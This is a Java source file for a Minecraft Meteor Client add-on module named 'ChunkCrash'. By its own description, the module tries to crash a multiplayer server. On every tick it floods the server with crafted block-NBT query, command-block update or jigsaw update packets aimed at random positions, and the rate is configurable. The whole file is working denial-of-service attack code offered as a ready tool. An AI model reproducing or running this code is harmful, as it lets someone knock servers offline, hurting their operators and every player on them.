package puyodead1.mlp.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.block.entity.JigsawBlockEntity;
import net.minecraft.network.packet.c2s.play.QueryBlockNbtC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateJigsawC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import puyodead1.mlp.utils.BlockPosUtils;

public class ChunkCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>().name("mode").description("Which crash mode to use.").defaultValue(Mode.QueryBlockNbt).build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder().name("amount").description("How many packets to send to the server per tick.").defaultValue(5).min(1).sliderMin(1).sliderMax(100).build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder().name("auto-disable").description("Disables module on kick.").defaultValue(true).build());

    public ChunkCrash() {
        super(MLPAddOn.MLP_CATEGORY, "chunk-crash", "Attempts to crash the server by continuously loading chunks.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case QueryBlockNbt -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new QueryBlockNbtC2SPacket(0, new BlockPos(BlockPosUtils.pickRandomPos())));
            }
            case UpdateCommandBlock -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(new BlockPos(BlockPosUtils.pickRandomPos()), "a", CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
            }
            case UpdateJigsaw -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new UpdateJigsawC2SPacket(new BlockPos(BlockPosUtils.pickRandomPos()), Identifier.of("a"), Identifier.of("a"), Identifier.of("a"), "a", JigsawBlockEntity.Joint.ALIGNED, 1, 1));
            }

        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        QueryBlockNbt, UpdateCommandBlock, UpdateJigsaw
    }

    public enum Block {
        OakSign, Dispenser, Furnace, Dropper, Hopper, Observer, Lectern, Beehive, BeeNest, Chest, TrappedChest, Jukebox, ArmorStand, Campfire
    }
}
